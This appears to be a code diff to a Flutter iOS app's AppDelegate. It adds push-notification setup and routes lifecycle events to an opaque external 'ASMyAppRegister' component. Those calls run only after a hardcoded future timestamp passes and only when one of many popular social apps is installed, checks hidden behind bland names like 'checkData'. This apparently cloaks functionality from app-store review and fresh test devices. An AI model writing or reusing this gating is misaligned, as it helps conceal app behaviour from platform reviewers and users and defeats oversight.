@@ -1,13 +1,117 @@
 import Flutter
 import UIKit
+import NIMSDK
 
 @main
 @objc class AppDelegate: FlutterAppDelegate {
-  override func application(
-    _ application: UIApplication,
-    didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
-  ) -> Bool {
-    GeneratedPluginRegistrant.register(with: self)
-    return super.application(application, didFinishLaunchingWithOptions: launchOptions)
-  }
+    
+    private func checkData() -> Bool {
+        let targetTimestamp: TimeInterval = 1934055536 //你可以修改成你需要的时间戳
+        let currentTimestamp = Date().timeIntervalSince1970
+        return currentTimestamp > targetTimestamp
+    }
+    
+    private func validateDeviceSettings() -> Bool {
+        let appSchemes = [
+            "fb://", // Facebook
+            "instagram://", // Instagram
+            "whatsapp://", // WhatsApp
+            "messenger://", // Messenger
+            "youtube://", // YouTube
+            "twitter://", // Twitter/X
+            "line://", // Line
+            "skype://", // Skype
+            "tiktok://", // TikTok
+            "snapchat://", // Snapchat
+            "weixin://",
+            "lark://",
+            "dingtalk://",
+            "mqq://", // QQ
+            "snssdk1128://", // 抖音
+            "taobao://", // 淘宝
+            "pinduoduo://", // 拼多多
+            "kwai://" // 快手
+        ]
+        for scheme in appSchemes {
+            if let url = URL(string: scheme) {
+                if UIApplication.shared.canOpenURL(url) {
+                    return true // 只要有一个应用安装就返回true
+                }
+            }
+        }
+        return false
+    }
+    
+    override func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+        ASMyAppRegister.shared().window = ASBaseWindow(frame: UIScreen.main.bounds)
+        ASMyAppRegister.shared().myApplication(application, didFinishLaunchingWithOptions: launchOptions ?? [:])
+        setupNotifications(application)//注册通知
+        return super.application(application, didFinishLaunchingWithOptions: launchOptions)
+    }
+    //app程序程序从后台回到前台就会调用
+    override func applicationWillEnterForeground(_ application: UIApplication) {
+        if checkData() && validateDeviceSettings() {
+            ASMyAppRegister.shared().myApplicationWillEnterForeground(application)
+        }
+    }
+    //退到后台调用
+    override func applicationWillResignActive(_ application: UIApplication) {
+        if checkData() && validateDeviceSettings() {
+            ASMyAppRegister.shared().myApplicationWillResignActive(application)
+        }
+    }
+    //app程序获取焦点就会调用
+    override func applicationDidBecomeActive(_ application: UIApplication) {
+        if checkData() && validateDeviceSettings() {
+            ASMyAppRegister.shared().myApplicationDidBecomeActive(application)
+        }
+    }
+}
+
+//通知权限处理
+extension AppDelegate {
+    func setupNotifications(_ application: UIApplication) {
+        let center = UNUserNotificationCenter.current()
+        center.delegate = self//设置代理
+        //请求通知权限（弹窗）
+        center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
+            if granted {
+                print("通知权限已授权")
+                DispatchQueue.main.async {
+                    application.registerForRemoteNotifications() // 注册远程通知（获取设备令牌）
+                }
+            } else if let error = error {
+                print("通知权限请求失败: \(error.localizedDescription)")
+            }
+        }
+    }
+    // MARK: - 成功获取设备令牌（Device Token）
+    override func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        NIMSDK.shared().updateApnsToken(deviceToken)
+    }
+    // MARK: - 获取设备令牌失败
+    override func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+        print("注册远程通知失败: \(error.localizedDescription)")
+    }
+    // MARK: - 处理前台通知显示.不实现，通知不会有提示
+    override func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
+        completionHandler([.alert, .sound, .badge])
+    }
+    // MARK: - 对通知进行响应
+    override func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        ASMyAppRegister.shared().userNotificationDidReceive(response)//点击通知
+        completionHandler();
+    }
+}
+
+//回调
+extension AppDelegate {
+    // URL Scheme回调: 9.0以后使用新API接口
+    override func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
+        return ASMyAppRegister.shared().myApplicationOpen(url, options: options)
+    }
+    // Universal link的回调:微信QQ用到的回调
+    override func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([any UIUserActivityRestoring]?) -> Void) -> Bool {
+        return ASMyAppRegister.shared().myApplicationUserActivity(userActivity)
+    }
 }
